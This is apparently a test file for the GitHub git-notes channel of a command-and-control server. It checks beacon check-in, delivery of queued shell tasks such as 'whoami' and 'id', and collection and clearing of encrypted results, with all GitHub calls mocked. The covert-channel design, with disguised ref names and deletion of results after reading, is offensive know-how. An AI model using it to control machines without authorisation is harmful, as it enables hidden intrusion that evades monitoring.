import { describe, it, expect, mock, beforeEach, afterEach } from "bun:test";
import { NotesChannel } from "../channels/NotesChannel.ts";
import { BeaconRegistry } from "../BeaconRegistry.ts";
import { TaskQueue } from "../TaskQueue.ts";
import { generateOperatorKeyPair, bytesToBase64, encryptForBeacon } from "../crypto/sodium.ts";

// ── Octokit mock factory ──────────────────────────────────────────────────────

function makeOctokit(overrides: Record<string, any> = {}) {
  return {
    rest: {
      git: {
        listMatchingRefs: mock(async () => ({ data: [] })),
        getBlob:          mock(async () => ({ data: { content: "", encoding: "utf-8" } })),
        createBlob:       mock(async () => ({ data: { sha: "blob-sha" } })),
        createRef:        mock(async () => ({})),
        updateRef:        mock(async () => ({})),
        deleteRef:        mock(async () => ({})),
        ...overrides.git,
      },
    },
    ...overrides,
  } as any;
}

describe("NotesChannel", () => {
  let registry: BeaconRegistry;
  let queue: TaskQueue;
  let operatorKp: { publicKey: Uint8Array; secretKey: Uint8Array };

  beforeEach(async () => {
    registry = new BeaconRegistry("/tmp/notes-channel-test-registry");
    queue    = new TaskQueue();
    operatorKp = await generateOperatorKeyPair();
  });

  it("start() and stop() do not throw", () => {
    const ch = new NotesChannel(registry, queue, {
      owner: "owner", repo: "repo", token: "tok",
      operatorSecretKey: operatorKp.secretKey,
      pollIntervalMs: 60_000,
      octokit: makeOctokit(),
    });
    ch.start();
    ch.stop();
  });

  it("poll processes ACK ref and registers beacon", async () => {
    const beaconId = "ack-beacon-id-1234";
    const beaconKp = await generateOperatorKeyPair();
    const ackContent = JSON.stringify({
      beaconId,
      publicKey: await bytesToBase64(beaconKp.publicKey),
      hostname: "host", username: "user", os: "linux", arch: "x64",
      checkinAt: new Date().toISOString(),
    });

    const octokit = makeOctokit({
      git: {
        listMatchingRefs: mock(async (params: any) => {
          if (params.ref?.includes("svc-a-")) {
            return { data: [{ ref: `refs/notes/svc-a-${beaconId.slice(0, 8)}`, object: { sha: "ack-sha" } }] };
          }
          return { data: [] };
        }),
        getBlob: mock(async () => ({
          data: { content: ackContent, encoding: "utf-8" }
        })),
        createBlob: mock(async () => ({ data: { sha: "blob-sha" } })),
        createRef:  mock(async () => ({})),
        updateRef:  mock(async () => ({})),
        deleteRef:  mock(async () => ({})),
      },
    });

    const ch = new NotesChannel(registry, queue, {
      owner: "owner", repo: "repo", token: "tok",
      operatorSecretKey: operatorKp.secretKey,
      pollIntervalMs: 60_000,
      octokit,
    });

    await (ch as any).poll();

    const beacon = registry.get(beaconId);
    expect(beacon).not.toBeUndefined();
    expect(beacon!.hostname).toBe("host");
    expect(beacon!.publicKey).toBe(await bytesToBase64(beaconKp.publicKey));
  });

  it("poll delivers pending tasks to notes beacon via task ref", async () => {
    const beaconId = "task-beacon-abcd1234";
    const beaconKp = await generateOperatorKeyPair();
    const pubB64   = await bytesToBase64(beaconKp.publicKey);

    // Register the beacon
    registry.register({
      beaconId, issueNumber: 0, publicKey: pubB64,
      hostname: "h", username: "u", os: "linux", arch: "x64", seq: 0,
    });
    // Queue a task
    queue.queueTask(beaconId, "shell", { cmd: "whoami" });

    const octokit = makeOctokit({
      git: {
        listMatchingRefs: mock(async () => ({ data: [] })),
        getBlob:    mock(async () => ({ data: { content: "", encoding: "utf-8" } })),
        createBlob: mock(async () => ({ data: { sha: "new-blob-sha" } })),
        createRef:  mock(async () => ({})),
        updateRef:  mock(async () => ({})),
        deleteRef:  mock(async () => ({})),
      },
    });

    const ch = new NotesChannel(registry, queue, {
      owner: "owner", repo: "repo", token: "tok",
      operatorSecretKey: operatorKp.secretKey,
      pollIntervalMs: 60_000,
      octokit,
    });

    // Prime the notes-beacon set so the channel knows this is a notes beacon
    (ch as any).notesBeacons.add(beaconId);
    await (ch as any).poll();

    // A blob should have been created with encrypted tasks
    expect(octokit.rest.git.createBlob).toHaveBeenCalled();
    // A ref should have been created or updated
    const refCalls =
      (octokit.rest.git.createRef as any).mock.calls.length +
      (octokit.rest.git.updateRef as any).mock.calls.length;
    expect(refCalls).toBeGreaterThan(0);
  });

  it("poll processes result ref, marks task completed, and clears ref", async () => {
    const beaconId = "result-beacon-abcdef12";
    const beaconKp = await generateOperatorKeyPair();

    // Register beacon and queue + deliver a task
    registry.register({
      beaconId, issueNumber: 0, publicKey: await bytesToBase64(beaconKp.publicKey),
      hostname: "h", username: "u", os: "linux", arch: "x64", seq: 0,
    });
    const task = queue.queueTask(beaconId, "shell", { cmd: "id" });
    queue.markDelivered(task.taskId);

    // Import sealBox from server crypto
    const { sealBox: serverSealBox } = await import("../crypto/sodium.ts");
    const resultPayload = JSON.stringify({
      taskId: task.taskId, beaconId,
      success: true, output: "uid=0(root)", completedAt: new Date().toISOString(),
    });
    const sealed = await serverSealBox(resultPayload, operatorKp.publicKey);

    const octokit = makeOctokit({
      git: {
        listMatchingRefs: mock(async (params: any) => {
          if (params.ref?.includes("svc-r-")) {
            return { data: [{ ref: `refs/notes/svc-r-${beaconId.slice(0, 8)}`, object: { sha: "res-sha" } }] };
          }
          return { data: [] };
        }),
        getBlob: mock(async () => ({ data: { content: sealed, encoding: "utf-8" } })),
        createBlob: mock(async () => ({ data: { sha: "clr-sha" } })),
        createRef:  mock(async () => ({})),
        updateRef:  mock(async () => ({})),
        deleteRef:  mock(async () => ({})),
      },
    });

    const ch = new NotesChannel(registry, queue, {
      owner: "owner", repo: "repo", token: "tok",
      operatorSecretKey: operatorKp.secretKey,
      pollIntervalMs: 60_000,
      octokit,
    });

    await (ch as any).poll();

    const completed = queue.getTask(task.taskId);
    expect(completed?.state).toBe("completed");
    expect(octokit.rest.git.deleteRef).toHaveBeenCalledTimes(1);
  });
});
